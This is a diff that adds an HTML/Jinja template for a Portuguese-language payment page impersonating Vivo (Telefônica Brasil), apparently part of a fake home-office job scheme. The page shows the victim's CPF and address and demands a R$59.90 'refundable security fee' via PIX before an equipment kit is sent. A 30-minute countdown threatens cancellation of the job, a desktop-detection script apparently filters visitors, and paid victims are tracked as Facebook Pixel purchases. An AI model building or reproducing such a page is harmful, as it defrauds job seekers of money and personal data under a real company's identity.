@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "r7dfa6ijq3");
+    </script>
+
+    <!-- Facebook Pixel Codes -->
+    {% include 'pagamento_head.html' %}
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento - Vagas Home Office - Vivo</title>
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeRegular.woff2') }}') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeBold.woff2') }}') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'VivoType';
+            src: url('{{ url_for('static', filename='fonts/VivoTypeLight.woff2') }}') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+</head>
+<body>
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <a href="{{ url_for('index') }}">
+                        <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                    </a>
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">TRABALHE CONOSCO &gt; HOME OFFICE &gt; PAGAMENTO</span>
+        </div>
+    </div>
+
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto">
+                <div class="card shadow-sm">
+                    <div class="card-header" style="background-color: #660099; color: white;">
+                        <h5 class="mb-0">Pagamento da Taxa de Envio e Segurança</h5>
+                    </div>
+                    <div class="card-body p-4">
+                        <!-- Kit de Equipamentos Título e Imagem -->
+                        <div class="text-center mb-4">
+                            <h4 style="color: #660099; font-weight: 500; margin-bottom: 15px;">SEU KIT DE EQUIPAMENTOS VIVO</h4>
+                            <img src="https://i.ibb.co/s9TNbjWP/assets-task-01jvmjhjnefe58ezr0bj1a70h5-1747668560-img-1-1.webp" alt="Kit de Equipamentos" class="img-fluid rounded mb-4" style="max-width: 90%; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                        </div>
+
+                        <!-- Aviso Importante -->
+                        <div class="card mb-4" style="border: 1px solid #ff9800; border-radius: 0px; box-shadow: 0 3px 10px rgba(0,0,0,0.1);">
+                            <div class="card-header" style="background-color: #ff9800; color: white;">
+                                <h6 class="mb-0"><i class="fas fa-exclamation-triangle me-2"></i> AVISO IMPORTANTE</h6>
+                            </div>
+                            <div class="card-body" style="background-color: #fff9e6;">
+                                <p style="font-size: 0.95rem;">A <strong>Vivo S.A.</strong> está com necessidade urgente de novos atendentes e precisa que você comece a trabalhar o mais rápido possível. Assim que os equipamentos chegarem, você já poderá iniciar suas atividades.</p>
+
+                                <p style="font-size: 0.95rem;"><strong>Importante:</strong> Os cartões Vale Saúde e alimentação, bem como o kit completo contendo Colete, Notebook e Headset serão entregues apenas após a confirmação do pagamento da Taxa Reembolsável de Segurança.</p>
+
+                                <p style="font-size: 0.95rem; color: #d32f2f;"><strong>Atenção:</strong> Caso o pagamento não seja realizado dentro de 30 minutos, o contrato de trabalho com a Vivo S.A. será automaticamente cancelado e a vaga será oferecida a outro candidato.</p>
+                            </div>
+                        </div>
+
+                        <!-- Imagem informativa -->
+                        <div class="mb-4 text-center">
+                            <img src="https://i.ibb.co/Pzhrwn2m/Inserir-um-subti-tulo-1-1.png" alt="Informações de Entrega" class="img-fluid" style="max-width: 100%; border-radius: 10px;">
+                        </div>
+
+                        <!-- Dados de entrega -->
+                        <div class="card mb-4" style="border: 1px solid #ddd; border-radius: 10px;">
+                            <div class="card-header bg-light">
+                                <h6 class="mb-0"><i class="fas fa-map-marker-alt me-2" style="color: #660099;"></i> Endereço de Entrega</h6>
+                            </div>
+                            <div class="card-body">
+                                <p class="mb-1"><strong>Nome:</strong> {{ nome }}</p>
+                                <p class="mb-1"><strong>CPF:</strong> {{ cpf }}</p>
+                                <p class="mb-3"><strong>Contato:</strong> {{ telefone|default('Não informado') }}</p>
+
+                                <p class="mb-1"><strong>Endereço:</strong> {{ endereco|default('Rua Exemplo, 123') }}</p>
+                                <p class="mb-1"><strong>Complemento:</strong> {{ complemento|default('Apto 101') }}</p>
+                                <p class="mb-1"><strong>Bairro:</strong> {{ bairro|default('Centro') }}</p>
+                                <p class="mb-1"><strong>Cidade/UF:</strong> {{ cidade|default('São Paulo') }}/{{ uf|default('SP') }}</p>
+                                <p class="mb-0"><strong>CEP:</strong> {{ cep|default('01310-200') }}</p>
+                            </div>
+                        </div>
+
+                        <!-- PIX Payment -->
+                        <div class="card mb-4" style="border: 1px solid #ddd; border-radius: 10px;">
+                            <div class="card-header" style="background-color: #660099; color: white;">
+                                <h6 class="mb-0"><i class="fas fa-qrcode me-2"></i> Pagamento via PIX - R$ 59,90</h6>
+                            </div>
+                            <div class="card-body text-center">
+                                <div class="row align-items-center">
+                                    <div class="col-md-6 mb-4 mb-md-0">
+                                        <h6 class="mb-3">QR Code PIX</h6>
+                                        <div class="border p-3 mx-auto" style="max-width: 230px; background-color: white; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
+                                            {% if pix_qr_code %}
+                                                <img src="{{ pix_qr_code }}" alt="QR Code PIX" class="img-fluid" style="width: 100%;">
+                                            {% else %}
+                                                <div class="py-5 text-center text-muted">
+                                                    <i class="fas fa-exclamation-circle" style="font-size: 40px;"></i>
+                                                    <p class="mt-2">QR Code indisponível</p>
+                                                </div>
+                                            {% endif %}
+                                        </div>
+                                        <div class="mt-3">
+                                            <span class="badge bg-warning text-dark">
+                                                <i class="fas fa-clock me-1"></i> Válido por <span id="countdown-timer">30:00</span>
+                                            </span>
+                                        </div>
+                                    </div>
+
+                                    <div class="col-md-6">
+                                        <h6 class="mb-3">Código PIX Copia e Cola</h6>
+                                        <div class="form-group">
+                                            <div class="input-group mb-3">
+                                                <input type="text" class="form-control" id="pix-code" value="{{ pix_code }}" readonly>
+                                                <button class="btn btn-outline-secondary border-start-0" type="button" id="copy-button-inside" onclick="copyPixCode()" style="background-color: white;">
+                                                    <i class="fas fa-copy" style="color: #660099;"></i>
+                                                </button>
+                                            </div>
+                                            <button class="btn w-100 mb-2" type="button" id="copy-button" onclick="copyPixCode()" style="background-color: #660099; color: white;">
+                                                <i class="fas fa-copy me-2"></i> Copiar código PIX
+                                            </button>
+                                            <div id="copy-message" class="text-success" style="display: none; font-size: 14px;">
+                                                <i class="fas fa-check-circle me-1"></i> Código copiado!
+                                            </div>
+                                        </div>
+
+                                        <div class="card mt-3 border-0 bg-light">
+                                            <div class="card-body py-3">
+                                                <h6 class="card-title" style="color: #660099; font-size: 15px;"><i class="fas fa-info-circle me-2"></i>Como pagar:</h6>
+                                                <ol class="mb-0 ps-3 small text-start">
+                                                    <li class="mb-1">Abra o app do seu banco</li>
+                                                    <li class="mb-1">Escolha pagar via PIX</li>
+                                                    <li class="mb-1">Escaneie o QR Code ou cole o código</li>
+                                                    <li>Confirme o pagamento de <strong>R$ 59,90</strong></li>
+                                                </ol>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="alert alert-success mt-4">
+                                    <h6 class="alert-heading mb-2"><i class="fas fa-check-circle me-2"></i> Próximo passo: Agendamento do treinamento</h6>
+                                    <p class="mb-0" style="font-size: 14px;">Após o pagamento, você será direcionado para agendar seu treinamento de 2 horas para começar a trabalhar. Falta apenas realizar o pagamento da taxa dos equipamentos para garantir a sua vaga!</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="text-center">
+                            <a href="{{ url_for('index') }}" class="btn btn-outline-secondary mt-3">Voltar à página inicial</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-4 mt-5" style="background-color: #660099; color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Produtos e Serviços</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Planos Móveis</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Internet Fixa</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">TV</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Combo Vivo</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Vivo App</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Suporte</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Minha Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">2ª Via de Conta</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Cobertura</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Desbloqueio</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="mb-3">Institucional</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sobre a Vivo</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Sustentabilidade</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Trabalhe Conosco</a></li>
+                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Para Empresas</a></li>
+                        <li><a href="#" class="text-white text-decoration-none">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="mb-3">Redes Sociais</h5>
+                    <div class="d-flex mb-4">
+                        <a href="#" class="text-white me-3"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white me-3"><i class="fab fa-youtube"></i></a>
+                        <a href="#" class="text-white"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <h5 class="mb-3">Baixe o App</h5>
+                    <div class="d-flex">
+                        <a href="#" class="text-white me-3"><i class="fab fa-app-store-ios"></i> App Store</a>
+                        <a href="#" class="text-white"><i class="fab fa-google-play"></i> Google Play</a>
+                    </div>
+                </div>
+            </div>
+            <hr class="my-4" style="border-color: rgba(255,255,255,0.2);">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap, jQuery e Popper.js -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+    <script>
+        // Cronômetro funcional para contagem regressiva de 30 minutos
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown-timer');
+            let minutes = 30;
+            let seconds = 0;
+
+            const countdownInterval = setInterval(function() {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(countdownInterval);
+                        alert('Tempo esgotado! O contrato de trabalho foi cancelado.');
+                        countdownElement.parentElement.classList.remove('bg-warning');
+                        countdownElement.parentElement.classList.add('bg-danger');
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+
+                // Formatação com leading zeros
+                const formattedMinutes = String(minutes).padStart(2, '0');
+                const formattedSeconds = String(seconds).padStart(2, '0');
+
+                countdownElement.textContent = `${formattedMinutes}:${formattedSeconds}`;
+
+                // Mudar para vermelho quando estiver nos últimos 5 minutos
+                if (minutes < 5) {
+                    countdownElement.style.color = 'red';
+                    countdownElement.style.fontWeight = 'bold';
+                }
+            }, 1000);
+        }
+
+        // Iniciar o cronômetro quando a página carregar
+        // Função para inicializar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            startCountdown();
+            startPaymentStatusCheck(); // Iniciar verificação automática
+        });
+
+        function copyPixCode() {
+            var copyText = document.getElementById("pix-code");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+
+            var copyMessage = document.getElementById("copy-message");
+            copyMessage.style.display = "block";
+
+            setTimeout(function() {
+                copyMessage.style.display = "none";
+            }, 3000);
+        }
+
+        // Verificação automática de status do pagamento
+        function startPaymentStatusCheck() {
+            // Obter o ID da transação
+            const transactionId = "{{ transaction_id }}";
+
+            if (!transactionId) {
+                console.error("ID da transação não disponível");
+                return;
+            }
+
+            console.log("Iniciando verificação de pagamento para transação: " + transactionId);
+
+            // Função para verificar o status
+            function checkPaymentStatus() {
+                fetch(`/check_payment_status/${transactionId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Status do pagamento:", data.status);
+
+                        if (data.status === 'approved') {
+                            // Pagamento aprovado - redirecionar para a página de treinamento
+                            console.log("Pagamento aprovado! Registrando evento e redirecionando...");
+
+                            // Registrar evento de compra nos pixels do Facebook
+                            if (typeof fbq !== 'undefined') {
+                                try {
+                                    // Valor fixo da taxa de equipamentos (R$ 59,90)
+                                    fbq('track', 'Purchase', {
+                                        value: 59.90,
+                                        currency: 'BRL',
+                                        transaction_id: transactionId
+                                    });
+                                    console.log("Evento de compra registrado com sucesso no Facebook Pixel!");
+                                } catch (e) {
+                                    console.error("Erro ao registrar evento de compra no Facebook Pixel:", e);
+                                }
+                            } else {
+                                console.error("Facebook Pixel não inicializado!");
+                            }
+
+                            // Mostrar mensagem de sucesso antes de redirecionar
+                            const successMessage = document.createElement('div');
+                            successMessage.className = 'alert alert-success position-fixed top-50 start-50 translate-middle p-4';
+                            successMessage.style.zIndex = '9999';
+                            successMessage.innerHTML = `
+                                <h4 class="alert-heading"><i class="fas fa-check-circle me-2"></i>Pagamento Aprovado!</h4>
+                                <p>Seu pagamento foi confirmado com sucesso. Redirecionando para o agendamento do treinamento...</p>
+                            `;
+                            document.body.appendChild(successMessage);
+
+                            // Redirecionar após 2 segundos
+                            setTimeout(() => {
+                                const currentParams = new URLSearchParams(window.location.search);
+                                const redirectUrl = new URL(data.redirect, window.location.origin);
+                                currentParams.forEach((value, key) => {
+                                    redirectUrl.searchParams.set(key, value);
+                                });
+                                window.location.href = redirectUrl.toString();
+                            }, 2000);
+                        } else if (data.status === 'error') {
+                            console.error("Erro ao verificar pagamento:", data.message);
+                        } else {
+                            // Continuar verificando a cada 1 segundo
+                            setTimeout(checkPaymentStatus, 1000);
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Erro na verificação:", error);
+                        // Tentar novamente após 3 segundos em caso de erro
+                        setTimeout(checkPaymentStatus, 3000);
+                    });
+            }
+
+            // Iniciar a verificação
+            checkPaymentStatus();
+        }
+
+    </script>
+</body>
+</html>
